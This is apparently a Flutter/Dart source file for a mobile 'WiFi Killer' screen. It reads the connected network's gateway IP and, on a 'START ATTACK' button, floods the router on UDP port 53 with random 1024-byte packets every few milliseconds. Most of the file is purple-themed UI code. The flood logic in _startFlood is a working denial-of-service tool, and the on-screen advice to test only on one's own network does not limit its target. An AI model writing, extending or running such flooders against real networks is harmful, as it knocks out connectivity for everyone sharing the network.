import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;
  int packetCount = 0;

  // --- TEMA DEEP PURPLE MODERN ---
  final Color bgDark = const Color(0xFF0A0A2A);
  final Color deepPurple = const Color(0xFF6B3FA0);
  final Color lightPurple = const Color(0xFF9B6BFF);
  final Color primaryWhite = Colors.white;
  final Color textGrey = Colors.grey.shade400;
  final Color subtleGlass = Colors.white.withOpacity(0.03);
  final Color borderSubtle = Colors.white.withOpacity(0.08);

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  void _cleanupFlood() {
    _loopTimer?.cancel();
    _loopTimer = null;
    isKilling = false;
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Request location permission
    final status = await Permission.locationWhenInUse.request();
    if (!mounted) return;
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Location access is required to read WiFi information.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      if (!mounted) return;
      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        ssid = "Error";
        ip = "Error";
        frequency = "Error";
        routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error" || routerIp.isEmpty) {
      _showAlert("Error", "Router IP not available. Please check your WiFi connection.");
      return;
    }

    // Validate router IP format
    final ipPattern = RegExp(r'^(\d{1,3}\.){3}\d{1,3}$');
    if (!ipPattern.hasMatch(routerIp)) {
      _showAlert("Error", "Invalid router IP: $routerIp");
      return;
    }

    setState(() {
      isKilling = true;
      packetCount = 0;
    });
    
    _showAlert("Attack Started", "WiFi killer attack is running.\nStop manually when done.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(1024, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 10), (_) async {
      if (!isKilling) return;
      
      try {
        final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
        socket.writeEventsEnabled = true;
        
        for (int j = 0; j < 5; j++) {
          socket.send(payload, InternetAddress(routerIp), targetPort);
          if (mounted) {
            setState(() {
              packetCount++;
            });
          }
        }
        socket.close();
      } catch (e) {
        // Silently handle errors to prevent crashes
      }
    });
  }

  void _stopFlood() {
    if (!mounted) return;
    setState(_cleanupFlood);
    _showAlert("Attack Stopped", "WiFi flood attack has been stopped.\nTotal packets sent: $packetCount");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: lightPurple.withOpacity(0.2)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: lightPurple,
            fontSize: 18,
            fontWeight: FontWeight.w600,
          ),
        ),
        content: Text(
          message,
          style: TextStyle(
            color: textGrey,
            fontSize: 13,
          ),
        ),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [deepPurple, lightPurple],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(10),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  "OK",
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: subtleGlass,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: borderSubtle),
      ),
      child: Row(
        children: [
          SizedBox(
            width: 100,
            child: Text(
              label,
              style: TextStyle(
                color: lightPurple,
                fontSize: 12,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
          Expanded(
            child: Text(
              value,
              style: TextStyle(
                color: primaryWhite,
                fontSize: 13,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _cleanupFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: lightPurple, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text(
          "WiFi Killer (Internal)",
          style: TextStyle(
            fontWeight: FontWeight.w600,
            fontSize: 18,
            letterSpacing: 0.5,
            color: primaryWhite,
          ),
        ),
        centerTitle: true,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              bgDark,
              deepPurple.withOpacity(0.05),
              bgDark,
            ],
          ),
        ),
        child: Padding(
          padding: const EdgeInsets.all(20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Header
              Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: deepPurple.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Icon(Icons.wifi_off, color: lightPurple, size: 24),
                  ),
                  const SizedBox(width: 12),
                  Text(
                    "Network Analysis",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),
              Text(
                "⚠️ This feature can disrupt your current WiFi network.\nUse only for testing purposes on your own network.",
                style: TextStyle(
                  color: textGrey,
                  fontSize: 12,
                  height: 1.4,
                ),
              ),
              const SizedBox(height: 24),

              // Info Card
              Container(
                decoration: BoxDecoration(
                  color: subtleGlass,
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: borderSubtle),
                ),
                padding: const EdgeInsets.all(16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      "Network Information",
                      style: TextStyle(
                        color: lightPurple,
                        fontSize: 14,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    const SizedBox(height: 12),
                    _infoRow("SSID", ssid),
                    _infoRow("IP Address", ip),
                    _infoRow("Frequency", "$frequency MHz"),
                    _infoRow("Router IP", routerIp),
                  ],
                ),
              ),

              const SizedBox(height: 32),

              // Action Button
              Center(
                child: Container(
                  height: 52,
                  width: double.infinity,
                  decoration: BoxDecoration(
                    gradient: isKilling ? null : LinearGradient(
                      colors: [deepPurple, lightPurple],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    color: isKilling ? Colors.redAccent.withOpacity(0.2) : null,
                    borderRadius: BorderRadius.circular(14),
                    border: isKilling ? Border.all(color: Colors.redAccent.withOpacity(0.5)) : null,
                  ),
                  child: ElevatedButton(
                    onPressed: isKilling ? _stopFlood : _startFlood,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(14),
                      ),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          isKilling ? Icons.stop : Icons.wifi_off,
                          color: isKilling ? Colors.redAccent : primaryWhite,
                          size: 18,
                        ),
                        const SizedBox(width: 8),
                        Text(
                          isKilling ? "STOP ATTACK" : "START ATTACK",
                          style: TextStyle(
                            fontSize: 13,
                            letterSpacing: 1,
                            color: isKilling ? Colors.redAccent : primaryWhite,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),

              const SizedBox(height: 20),

              if (isKilling)
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: subtleGlass,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: borderSubtle),
                  ),
                  child: Column(
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          SizedBox(
                            width: 20,
                            height: 20,
                            child: CircularProgressIndicator(
                              color: lightPurple,
                              strokeWidth: 2,
                            ),
                          ),
                          const SizedBox(width: 12),
                          Text(
                            "Sending Packets...",
                            style: TextStyle(
                              color: lightPurple,
                              fontSize: 12,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text(
                        "Total packets sent: $packetCount",
                        style: TextStyle(
                          color: textGrey,
                          fontSize: 11,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ],
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
